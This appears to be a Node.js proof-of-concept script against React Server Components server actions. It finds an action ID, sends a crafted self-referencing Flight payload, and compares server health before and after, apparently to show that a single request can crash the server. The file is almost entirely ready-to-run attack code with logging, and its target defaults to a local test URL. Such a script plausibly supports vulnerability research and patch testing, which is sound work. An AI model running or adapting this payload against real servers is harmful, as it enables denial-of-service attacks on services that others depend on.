'use strict';
const { discoverActionIds, sendFlightRequest, checkServerHealth } = require('../../flight-harness/flightHarness');
// AndrewMohawkSpiderMark-ZGVnZW5lcmF0ZXBhcnR5dGltZQ

async function warmUp(target) {
  try {
    await fetch(target, { method: 'GET' });
  } catch {
    // best-effort
  }
}

async function main() {
  const target = process.argv[2] || 'http://127.0.0.1:3005/test';
  const { actionIds } = await discoverActionIds(target);
  const actionId = actionIds[0];
  const payload = '["$F1", {"wrap":"$R0"}, ["$L0","$F1"]]';
  console.log(`[+] Target: ${target}`);
  console.log(`[+] Action ID: ${actionId}`);
  console.log(`[*] Payload: ${payload}`);
  await warmUp(target);
  const before = await checkServerHealth(target);
  console.log(`Health before: ${before.ok ? 'up' : 'down'} (${before.status || before.error})`);
  const res = await sendFlightRequest({ target, actionId, payload, contentType: 'text/plain;charset=UTF-8' });
  console.log(`Response: status=${res.status || 'err'} body=${(res.body || '').slice(0, 200)}`);
  const after = await checkServerHealth(target);
  console.log(`Health after: ${after.ok ? 'up' : 'down'} (${after.status || after.error})`);
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
